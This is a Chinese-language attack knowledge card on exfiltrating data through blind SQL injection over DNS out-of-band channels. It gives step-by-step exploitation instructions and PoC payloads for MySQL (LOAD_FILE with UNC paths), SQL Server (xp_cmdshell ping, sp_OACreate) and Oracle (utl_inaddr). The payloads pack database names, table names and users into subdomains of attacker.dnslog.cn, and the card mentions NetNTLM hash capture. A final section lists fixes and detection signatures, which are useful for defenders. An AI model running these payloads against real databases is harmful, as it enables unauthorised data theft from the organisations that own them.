---
id: web-generic-sqli-dnslog-oob-exfiltration
title: SQL 注入无回显的 DNS 带外取数：LOAD_FILE UNC 与 xp_cmdshell ping
type: scenario
domain: web
path: web/generic/sqli
technique: sqli-dns-oob-exfiltration
aliases:
- SQL 注入 DNSLOG
- DNS 带外注入
- 无回显 SQL 注入
- LOAD_FILE UNC 注入
- xp_cmdshell DNS
- OOB SQL injection
tags:
- sqli
- dnslog
- oob
- load-file
- xp-cmdshell
- blind
- mysql
- mssql
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T01:15:31+08:00'
  notes: 原文无图片，已核对 MySQL Windows LOAD_FILE UNC、SQL Server xp_cmdshell ping、sp_OACreate、Oracle utl_inaddr 均可触发 DNS；卡中已纠正原文 PostgreSQL pg_send_query 的错误写法（查询文本不会解析域名），并注明 DNS 标签/总长限制与 secure_file_priv 边界。原文仅泛述，confidence=medium 合理。原文未涉及版本区间。未执行 PoC。
---

## 一句话结论

当 SQL 注入既无回显、又无法通过布尔/时间差异判断时，可让数据库主动发起 DNS 查询，把查询结果拼进域名标签；攻击者控制的 DNS 服务器收到解析请求即可确认注入并带出数据。MySQL（Windows）可用 `LOAD_FILE` 访问 UNC 路径，SQL Server 可用 `xp_cmdshell` 执行 `ping`。

## 原理

- DNS 带外的核心是把“数据”编码进一个域名，然后让目标主机解析该域名；权威 DNS 服务器会把完整的查询名记录在日志里，攻击者读取日志即可还原数据。
- MySQL（Windows）：`LOAD_FILE('\\\\host\\share')` 会把 `host` 当作 SMB 主机名并触发 DNS 解析。用 `CONCAT('\\\\', (SELECT database()), '.attacker.dnslog.cn\\a')` 把数据库名拼进主机名，解析请求就会带着数据库名发到攻击者的 DNS 服务器。
- SQL Server：`xp_cmdshell 'ping -n 1 <data>.attacker.dnslog.cn'` 让系统命令 `ping` 解析域名；数据放在子域名中。也可用 `sp_OACreate` 创建 `WinHttp.WinHttpRequest` 发起 HTTP/DNS 请求。
- Oracle：`utl_inaddr.get_host_address('<data>.attacker.dnslog.cn')` 或 `utl_http.request` 可触发解析。
- PostgreSQL 的 DNS 带外不像前两者直接：`pg_send_query` 只是异步发送 SQL 字符串，查询文本中的域名不会被当作主机名解析；可靠方式通常需要 `COPY ... TO PROGRAM` 或 `dblink`/`postgres_fdw` 连接外部主机，且要求较高权限，不能照搬本文的 `pg_send_query` 写法。
- 数据长度受 DNS 标签限制：单个标签最长 63 字节，完整域名最长 253 字节；长数据需用 `SUBSTR` 分段、十六进制编码或多次查询。

## 触发条件

- 存在 SQL 注入，但页面无回显、布尔/时间通道不可用或被严格限制。
- 目标数据库与主机允许出站 DNS（多数内网默认允许）。
- MySQL：Windows 主机、当前账号有 `FILE` 权限，且 `secure_file_priv` 未阻止 UNC 路径；`LOAD_FILE` 可用。
- SQL Server：`xp_cmdshell` 已启用（或 `sp_OACreate`/OLE 自动化可用），当前账号有相应权限。
- 攻击者拥有可记录 DNS 查询的域名/平台（如自建权威 DNS、dnslog 服务）。

## 利用步骤

1. 准备 DNS 记录平台，获得一个可控域名，确认能查看解析日志。
2. 确认数据库类型与可用函数（报错信息、版本函数）。
3. 先用固定字符串测试解析，例如让数据库解析 `test.attacker.dnslog.cn`，看平台是否收到请求。
4. 确认可达后，把要提取的数据拼进子域名，使用 `SUBSTR`/`HEX` 控制长度与字符集。
5. 分批查询，逐段还原数据（库名、表名、字段值）。
6. 若 DNS 被限制，尝试 HTTP 带外（`LOAD_FILE` 访问 UNC 的 SMB 也可能被限制）或改用时间盲注。

## PoC

MySQL（Windows）：

```sql
-- 先确认 DNS 可达
SELECT LOAD_FILE(CONCAT('\\\\', 'test', '.attacker.dnslog.cn\\a'));

-- 带出当前数据库名
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.dnslog.cn\\a'));

-- 带出较长数据时截取并转十六进制
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT HEX(SUBSTR((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),1,30))), '.attacker.dnslog.cn\\a'));
```

SQL Server：

```sql
-- 确认 xp_cmdshell 可用并触发 DNS
EXEC xp_cmdshell 'ping -n 1 test.attacker.dnslog.cn';

-- 带出数据库名
EXEC xp_cmdshell 'ping -n 1 ' + (SELECT TOP 1 CAST(name AS VARCHAR(255)) FROM sys.databases) + '.attacker.dnslog.cn';
```

`sp_OACreate` 变体（xp_cmdshell 被禁用时，需 OLE 自动化可用）：

```sql
DECLARE @h INT;
EXEC sp_OACreate 'WinHttp.WinHttpRequest.5.1', @h OUT;
EXEC sp_OAMethod @h, 'Open', NULL, 'GET',
  'http://' + (SELECT TOP 1 CAST(name AS VARCHAR(255)) FROM sys.databases) + '.attacker.dnslog.cn';
EXEC sp_OAMethod @h, 'Send';
```

Oracle 变体：

```sql
SELECT utl_inaddr.get_host_address((SELECT user FROM dual) || '.attacker.dnslog.cn') FROM dual;
```

说明：

- MySQL 的 `LOAD_FILE` 在 Linux 上通常不会把 UNC 当网络路径解析，Linux 目标应改用其他带外方式。
- `secure_file_priv` 为空或允许对应目录时才可能成功；MySQL 8 默认限制更严。
- 子域名中不能包含点、空格等非法字符，必要时用 `HEX()` 编码；单次数据不宜超过 60 字节。

## 变体与关联

- 变体：把数据编码进 DNS 查询类型、子域名层级或多次查询的组合，绕过单标签长度限制。
- 变体：SMB 带外（`LOAD_FILE` 访问攻击者 SMB）可在 DNS 之外直接回连并抓取 NetNTLM 哈希，属于另一条链路。
- 关联：[[web-generic-sqli-blind-filter-bypass-functions]]（DNS 不可用时的布尔/时间替代）。
- 关联：[[web-generic-sqli-mssql-stacked-xp-cmdshell]]（xp_cmdshell 的启用与命令执行）。
- 边界：目标禁止出站 DNS、`secure_file_priv` 限制、`xp_cmdshell` 与 OLE 自动化均禁用时，本手法失效。

## 检测与防御

- 修复：参数化查询，消除注入；数据库账号最小权限，撤销 `FILE`、`sysadmin`、`xp_cmdshell` 执行权。
- 加固：`secure_file_priv` 指向固定目录或 `NULL`；禁用 `xp_cmdshell`、OLE 自动化、`utl_http`/`utl_inaddr` 等不必要组件。
- 加固：限制数据库主机出站 DNS/HTTP/SMB，仅允许必要域名；对 DNS 查询做日志与异常子域名检测。
- 检测：数据库进程/主机发起异常 DNS 查询（随机长标签、含数据库名/表名/十六进制串）；`xp_cmdshell` 执行 `ping`/`nslookup`；`LOAD_FILE` 访问 UNC 路径；SQL 日志中出现 `LOAD_FILE`、`xp_cmdshell`、`utl_inaddr` 与 `CONCAT` 组合。
